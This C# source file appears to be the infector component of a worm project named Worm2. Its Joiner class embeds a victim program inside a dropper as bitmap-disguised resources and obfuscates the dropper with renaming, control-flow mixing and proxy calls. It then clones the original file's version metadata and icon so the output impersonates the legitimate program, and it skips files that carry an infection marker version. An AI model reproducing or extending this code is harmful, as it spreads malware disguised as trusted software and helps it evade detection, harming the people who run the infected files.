using System;
using System.IO;
using System.Linq;
using Plugin.Properties;
using Vestris.ResourceLib;
using Worm2.Files.CtrlFlow;
using Worm2.Files.Mixer;
using Worm2.Files.Proxy;
using Worm2.Files.Rename;
using Worm2.Helper;
using dnlib.DotNet;

namespace Worm2.Files;

internal class Joiner
{
	public static byte[] Compiler(byte[] original, string exsitions)
	{
		InformationFile informationFile = null;
		if (exsitions == ".exe")
		{
			informationFile = new InformationFile(original);
			if (informationFile.stringFileInfo["FileVersion"] == "5.12.3.82")
			{
				Console.WriteLine("File infected \"5.12.3.82\"");
				return null;
			}
		}
		else
		{
			informationFile = new InformationFile(exsitions);
			if (informationFile.stringFileInfo == null)
			{
				Console.WriteLine("Not support file");
				return null;
			}
		}
		return WriteSettings(original, informationFile);
	}

	public static byte[] WriteSettings(byte[] original, InformationFile informationFile)
	{
		using ModuleDefMD moduleDefMD = ModuleDefMD.Load(Resource1.Dropper);
		string randomCharacters = Randomizer.getRandomCharacters();
		string randomCharacters2 = Randomizer.getRandomCharacters();
		moduleDefMD.Resources.Add(new EmbeddedResource(randomCharacters, ByteToBitMap.BitmapToByteArray(ByteToBitMap.ByteToBitmap(original))));
		moduleDefMD.Resources.Add(new EmbeddedResource(randomCharacters2, ByteToBitMap.BitmapToByteArray(ByteToBitMap.ByteToBitmap(Config.Bulid))));
		foreach (TypeDef type in moduleDefMD.Types)
		{
			foreach (MethodDef method in type.Methods)
			{
				if (method.Body == null)
				{
					continue;
				}
				for (int i = 0; i < method.Body.Instructions.Count(); i++)
				{
					if (method.Body.Instructions[i].Operand as string == "%file1%")
					{
						method.Body.Instructions[i].Operand = randomCharacters;
					}
					if (method.Body.Instructions[i].Operand as string == "%file2%")
					{
						method.Body.Instructions[i].Operand = randomCharacters2;
					}
					if (method.Body.Instructions[i].Operand as string == "%exiteons%")
					{
						method.Body.Instructions[i].Operand = informationFile.exsitions;
					}
					Console.WriteLine(method.Body.Instructions[i].Operand as string);
				}
			}
		}
		Worm2.Files.Mixer.Mixer.Execute(moduleDefMD);
		Renamer.Execute(moduleDefMD);
		ControlFlowObfuscation.Execute(moduleDefMD);
		ProxyCall.Execute(moduleDefMD);
		ProxyString.Execute(moduleDefMD);
		ProxyInt.Execute(moduleDefMD);
		string tempFileName = Path.GetTempFileName();
		moduleDefMD.Write(tempFileName);
		moduleDefMD.Dispose();
		Console.WriteLine(informationFile.stringFileInfo["FileVersion"]);
		Console.WriteLine(informationFile.stringFileInfo["ProductVersion"]);
		Console.WriteLine(informationFile.stringFileInfo["ProductName"]);
		VersionResource versionResource = new VersionResource();
		versionResource.LoadFrom(tempFileName);
		versionResource.ProductVersion = informationFile.stringFileInfo["ProductVersion"];
		versionResource.FileVersion = informationFile.stringFileInfo["FileVersion"];
		versionResource.Language = 0;
		StringFileInfo obj = (StringFileInfo)versionResource["StringFileInfo"];
		obj["ProductName"] = informationFile.stringFileInfo["ProductName"];
		obj["FileDescription"] = informationFile.stringFileInfo["FileDescription"];
		obj["CompanyName"] = informationFile.stringFileInfo["CompanyName"];
		obj["LegalCopyright"] = informationFile.stringFileInfo["LegalCopyright"];
		obj["LegalTrademarks"] = informationFile.stringFileInfo["LegalTrademarks"];
		obj["Assembly Version"] = informationFile.stringFileInfo["ProductVersion"];
		obj["InternalName"] = informationFile.stringFileInfo["InternalName"];
		obj["OriginalFilename"] = informationFile.stringFileInfo["OriginalFilename"];
		obj["ProductVersion"] = informationFile.stringFileInfo["ProductVersion"];
		obj["FileVersion"] = informationFile.stringFileInfo["FileVersion"];
		versionResource.SaveTo(tempFileName);
		IconInjector.InjectIcon(tempFileName, informationFile.Icon);
		return File.ReadAllBytes(tempFileName);
	}
}
